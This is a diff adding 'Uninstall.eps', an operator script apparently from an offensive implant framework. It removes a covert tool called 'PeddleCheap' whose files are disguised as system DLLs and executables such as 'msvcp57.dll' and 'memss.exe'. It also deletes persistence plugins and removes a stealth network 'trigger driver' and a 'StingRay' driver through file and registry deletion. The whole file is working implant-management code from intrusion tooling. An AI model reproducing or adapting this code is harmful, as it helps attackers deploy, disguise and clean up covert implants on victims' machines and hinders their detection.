@@ -1,0 +1,292 @@
+#-------------------------------------------------------------------------------
+# File: Uninstall.eps
+# Description: Performs an uninstall of a level4
+#
+# Modifications:
+#	10/16/02	Created
+#	02/04/04	Updated for EP 3.0
+#	08/09/05	Updated for PC 1.5
+#-------------------------------------------------------------------------------
+@include "_FileExists.epm";
+@include "_GetSystemPaths.epm";
+@include "_GetSystemVersion.epm";
+
+@echo off;
+
+# make sure we can install on this version
+int $majorVersion;
+int $minorVersion;
+int $buildNumber;
+int $platformId;
+int $spMajorVersion;
+int $spMinorVersion;
+ifnot (_GetSystemVersion($majorVersion, $minorVersion, $buildNumber, $platformId, $spMajorVersion, $spMinorVersion)) {
+    echo "Unable to get system version";
+    pause;
+}
+
+# valid types (and their info)
+string %validTypes;
+%validTypes{'1'} = "PC (dll)";
+%validTypes{'2'} = "PC (exe)";
+bool $hasTriggerDriver = true;
+
+string %fileName;
+string %tempName;
+string %script;
+
+# PeddleCheap (dll)
+%fileName{'PC (dll)'}	= "msvcp57.dll";
+%tempName{'PC (dll)'}	= "msvcp57d.dll";
+%script{'PC (dll)'}	= "PeddleCheap\\UninstallDll.eps";
+
+# PeddleCheap (exe)
+%fileName{'PC (exe)'}	= "memss.exe";
+%tempName{'PC (exe)'}	= "memsso.exe";
+%script{'PC (exe)'}	= "PeddleCheap\\UninstallExe.eps";
+
+# remove invalid types
+if ($platformId == 1) {
+    # DLL versions aren't supported on 9x
+    undef(%validTypes{'1'});
+
+    # trigger drivers aren't supported on 9x
+    $hasTriggerDriver = false;
+}
+
+string $type = "";
+string $installedName = "";
+bool $install = false;
+bool $badParams = false;
+if ($argc > 3) {
+    $badParams = true;
+} else if ($argc > 1) {
+    if ($argv[1] == "?") {
+	$badParams = true;
+    } else {
+	# user specified type of uninstall
+	string $key;
+	foreach $key (keys %validTypes) {
+	    if ($argv[1] == %validTypes{$key}) {
+		$type = $argv[1];
+		break;
+	    }
+	}
+    
+	if ($type == "") {
+	    # type not found
+	    echo "";
+	    echo "***Invalid type***";
+	    echo "";
+	    $badParams = true;
+	}
+
+	if ($argc == 3) {
+	    $installedName = $argv[2];
+	}
+    }
+}
+
+if ($badParams) {
+    echo "Usage: $argv[0] [type] [installedName]";
+    echo "    Performs an uninstall of a tool";
+    echo "";
+    echo "    Valid Types:";
+    string $key;
+    foreach $key (keys %validTypes) {
+	echo "\t%validTypes{$key}";
+    }
+
+    if ($argc > 1) {
+	if ($argv[1] == "?") {
+	    return true;
+	}
+    }
+
+    return false;
+}
+
+if ($type == "") {
+    # no type specified...give a list
+    echo "Uninstall types:";
+    string $key;
+    foreach $key (keys %validTypes) {
+	echo "($key). %validTypes{$key}";
+    }
+    echo "(0). Quit";
+
+    while ($type == "") {
+	int $value = GetInput("Pick a type");
+	if ($value == 0) {
+	    # user quit
+	    return false;
+	}
+
+	if (defined(%validTypes{'$value'})) {
+	    $type = %validTypes{'$value'};
+	}
+    }
+	
+}
+
+bool $rtn = true;
+
+# delete long-term plugins
+if (prompt "Delete longterm EP plugins?") {
+    @record off;
+    echo "Deleting longterm EP plugins";
+    if (RemoveLongTermPlugins()) {
+	echo "    SUCCESS";
+    } else {
+	echo "    FAILED";
+	$rtn = false;
+    }
+}
+
+# uninstall given tool
+if ($installedName == "") {
+	#################################################################################
+	# Code Added to check for default dll names.
+	#################################################################################
+	if ($type == "PC (dll)") {
+		echo "";
+		if (_FileExists("appinit.dll")) {
+			echo "***** appinit.dll -> * PRESENT *";
+			$installedName = "appinit.dll";
+		} else { echo "***** appinit.dll -> not present"; }
+		if (_FileExists("msvcp57.dll")) { 
+			echo "***** msvcp57.dll -> * PRESENT *"; 
+			$installedName = "msvcp57.dll";
+		} else { echo "***** msvcp57.dll -> not present"; }
+		if (_FileExists("msvcp58.dll")) {
+			echo "***** msvcp58.dll -> * PRESENT *\n";
+			$installedName = "msvcp58.dll";
+		} else { echo "***** msvcp58.dll -> not present\n"; }
+	} else {
+		$installedName = %fileName{$type};
+	}
+	#################################################################################
+}
+
+
+ifnot (`script "%script{$type}" "$installedName" "%tempName{$type}"`) {
+    $rtn = false;
+}
+
+if ($hasTriggerDriver) {
+    # remove trigger driver
+    bool $proceedOld = false;
+    string $driverName = "ethip6";
+    string $root;
+    string $system;
+    string $systemPath;
+    @echo off;
+    ifnot (_GetSystemPaths($root, $system)) {
+	return false;
+    }
+    $systemPath = "$root\\$system";
+
+    
+    if (prompt "Do you want to uninstall the trigger driver?") {
+
+	#Check the version.
+	
+	#check if dg_status works
+	@echo off;
+	@record on;
+	ifnot (`dg_control -version -driver $driverName`) {
+		#if this failed, that means that it's 1.0.1, so we can proceed.
+		echo "DG appears to be version 1.0.1, proceeding with the uninstall, will require reboot";
+		$proceedOld = true;
+	} else {
+		int $major = GetCmdData("Major");
+		int $minor = GetCmdData("Minor");
+		int $build = GetCmdData("Build");
+	
+		if ("$major.$minor.$build" == "1.0.2") {
+			#this is 1.0.2, so we can proceed
+			#echo "DG is version 1.0.2, proceeding with the uninstall, will require reboot.";
+			$proceedOld = true;
+		}
+	
+		else {
+			#this is 1.0.3 or greater, so we can use "dg_uninstall"
+			echo "DG is version $major.$minor.$build, proceeding with uninstall.";
+		}
+
+	}
+	@record off;
+	@echo on;
+	
+	if ($proceedOld) {
+		echo "Uninstalling with out unloading the driver to prevent loss of network comms";
+	
+		ifnot (`del $driverName.sys -path "$systemPath\\drivers"`) {
+			echo "Couldn't delete driver $driverName!  Find help!";
+			$rtn = false;
+		}
+		
+		ifnot (`regdelkey -hive L -key "system\\currentcontrolset\\services\\$driverName" -recursive`) {
+			echo "Couldn't recursively delete the $driverName services key";
+			$rtn = false;
+		}
+		
+	} else {
+
+		ifnot (`dg_uninstall`) {
+	    		$rtn = false;
+		}
+	
+	}
+    }
+}
+
+
+if (`sr_control -available`) {
+    # remove StingRay driver
+    if (prompt "Do you want to uninstall the StingRay driver?") {
+	ifnot (`sr_uninstall`) {
+	    $rtn = false;
+	}
+    }
+}
+
+echo "";
+if ($rtn == true) {
+    echo "UNINSTALL SUCCEEDED";
+} else {
+    echo "*** UNINSTALL FAILED ***";
+}
+echo "";
+
+return $rtn;
+
+#---------------------------------------------------------------------------------
+sub RemoveLongTermPlugins()
+{
+
+    @record on;
+    ifnot (`longterm -list`) {
+	return false;
+    }
+
+    bool $rtn = true;
+    int $ids = GetCmdData("id");
+    int $id;
+    foreach $id ($ids) {
+	ifnot (`longterm -delete $id`) {
+	    $rtn = false;
+	}
+    }
+
+    ifnot (`longterm -list`) {
+	return false;
+    }
+    $ids = GetCmdData("id");
+    if (sizeof($ids) != 0) {
+	$rtn = false;
+    }
+
+    return $rtn;  
+
+} /* end RemoveLongTermPlugins */
